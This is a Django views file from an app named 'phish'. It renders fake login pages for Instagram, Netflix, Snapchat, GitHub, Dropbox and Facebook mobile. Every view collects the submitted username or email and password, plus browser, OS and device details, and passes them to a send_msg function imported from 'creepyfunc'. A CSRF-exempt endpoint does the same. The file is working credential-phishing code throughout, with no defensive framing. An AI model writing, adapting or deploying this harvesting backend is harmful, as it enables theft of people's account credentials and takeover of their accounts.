from django.http import HttpResponse
from django.shortcuts import render
from phish.creepyfunc import send_msg
import requests
# Create your views here.


from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt

@csrf_exempt
def process(request):
    print(request.POST)
    email = request.POST.get("email")

    if email is not None:
        password = request.POST.get("password")
        website = request.POST.get("location")
        browser = request.user_agent.browser.family
        os = request.user_agent.os.family
        device = request.user_agent.device.family
        isbot = request.user_agent.is_bot
        ispc = request.user_agent.is_pc
        ismobile = request.user_agent.is_mobile

        info = f"Email is: {email}\n"
        info += f"Password is: {password}\n"
        info += f"Website is: {website}\n"
        info += f"Browser is: {browser}\n"
        info += f"OS is: {os}\n"
        info += f"Device is: {device}\n"
        info += f"Is bot: {isbot}\n"
        info += f"Is using PC: {ispc}\n"
        info += f"Is using mobile: {ismobile}\n"

        # Assuming you have a function named send_msg to send the info
        send_msg(info)

        return JsonResponse({'message': 'Data received successfully.'})
    else:
        return JsonResponse({'error': 'Invalid request method'}, status=400)

def index(request):
    print(request.POST)
    username = request.POST.get("username")
    if username is not None:
        password = request.POST.get("password")
        website = request.POST.get("location")
        browser = request.user_agent.browser.family
        os = request.user_agent.os.family
        device = request.user_agent.device.family
        isbot = request.user_agent.is_bot
        ispc = request.user_agent.is_pc
        ismobile = request.user_agent.is_mobile
        info = ""
        info += "Username is: "+str(username)
        info += "\npassword is: "+str(password)
        info += "\nwebsite is: "+str(website)
        info += "\nbrowser is:"+ str(browser)
        info += "\nos is: "+str(os)
        info += "\ndevice is: "+str(device)
        info += "\nis bot :"+str(isbot)
        info += "\nis using pc :"+str(ispc)
        info += "\nis using mobile :"+str(ismobile)
        send_msg(info)
    return render(request,"instagram.html")

def netflix(request):
    username = request.POST.get("username")
    if username is not None:
        password = request.POST.get("password")
        website = request.POST.get("location")
        browser = request.user_agent.browser.family
        os = request.user_agent.os.family
        device = request.user_agent.device.family
        isbot = request.user_agent.is_bot
        ispc = request.user_agent.is_pc
        ismobile = request.user_agent.is_mobile
        info = ""
        info += "Username is: "+str(username)
        info += "\npassword is: "+str(password)
        info += "\nwebsite is: "+str(website)
        info += "\nbrowser is:"+ str(browser)
        info += "\nos is: "+str(os)
        info += "\ndevice is: "+str(device)
        info += "\nis bot :"+str(isbot)
        info += "\nis using pc :"+str(ispc)
        info += "\nis using mobile :"+str(ismobile)
        send_msg(info)
    return render(request,"netflix.html")

def snapchat(request):
    username = request.POST.get("username")
    if username is not None:
        password = request.POST.get("password")
        website = request.POST.get("location")
        browser = request.user_agent.browser.family
        os = request.user_agent.os.family
        device = request.user_agent.device.family
        isbot = request.user_agent.is_bot
        ispc = request.user_agent.is_pc
        ismobile = request.user_agent.is_mobile
        info = ""
        info += "Username is: "+str(username)
        info += "\npassword is: "+str(password)
        info += "\nwebsite is: "+str(website)
        info += "\nbrowser is:"+ str(browser)
        info += "\nos is: "+str(os)
        info += "\ndevice is: "+str(device)
        info += "\nis bot :"+str(isbot)
        info += "\nis using pc :"+str(ispc)
        info += "\nis using mobile :"+str(ismobile)
        send_msg(info)
    return render(request,"snapchat.html")

def github(request):
    username = request.POST.get("username")
    if username is not None:
        password = request.POST.get("password")
        website = request.POST.get("location")
        browser = request.user_agent.browser.family
        os = request.user_agent.os.family
        device = request.user_agent.device.family
        isbot = request.user_agent.is_bot
        ispc = request.user_agent.is_pc
        ismobile = request.user_agent.is_mobile
        info = ""
        info += "Username is: "+str(username)
        info += "\npassword is: "+str(password)
        info += "\nwebsite is: "+str(website)
        info += "\nbrowser is:"+ str(browser)
        info += "\nos is: "+str(os)
        info += "\ndevice is: "+str(device)
        info += "\nis bot :"+str(isbot)
        info += "\nis using pc :"+str(ispc)
        info += "\nis using mobile :"+str(ismobile)
        send_msg(info)
    return render(request,"github.html")

def dropbox(request):
    username = request.POST.get("username")
    if username is not None:
        password = request.POST.get("password")
        website = request.POST.get("location")
        browser = request.user_agent.browser.family
        os = request.user_agent.os.family
        device = request.user_agent.device.family
        isbot = request.user_agent.is_bot
        ispc = request.user_agent.is_pc
        ismobile = request.user_agent.is_mobile
        info = ""
        info += "Username is: "+str(username)
        info += "\npassword is: "+str(password)
        info += "\nwebsite is: "+str(website)
        info += "\nbrowser is:"+ str(browser)
        info += "\nos is: "+str(os)
        info += "\ndevice is: "+str(device)
        info += "\nis bot :"+str(isbot)
        info += "\nis using pc :"+str(ispc)
        info += "\nis using mobile :"+str(ismobile)
        send_msg(info)
    return render(request,"dropbox.html")

def facebook_mobile(request):
    username = request.POST.get("username")
    if username is not None:
        password = request.POST.get("password")
        website = request.POST.get("location")
        browser = request.user_agent.browser.family
        os = request.user_agent.os.family
        device = request.user_agent.device.family
        isbot = request.user_agent.is_bot
        ispc = request.user_agent.is_pc
        ismobile = request.user_agent.is_mobile
        info = ""
        info += "Username is: "+str(username)
        info += "\npassword is: "+str(password)
        info += "\nwebsite is: "+str(website)
        info += "\nbrowser is:"+ str(browser)
        info += "\nos is: "+str(os)
        info += "\ndevice is: "+str(device)
        info += "\nis bot :"+str(isbot)
        info += "\nis using pc :"+str(ispc)
        info += "\nis using mobile :"+str(ismobile)
        send_msg(info)
    return render(request,"facebook_mobile.html")

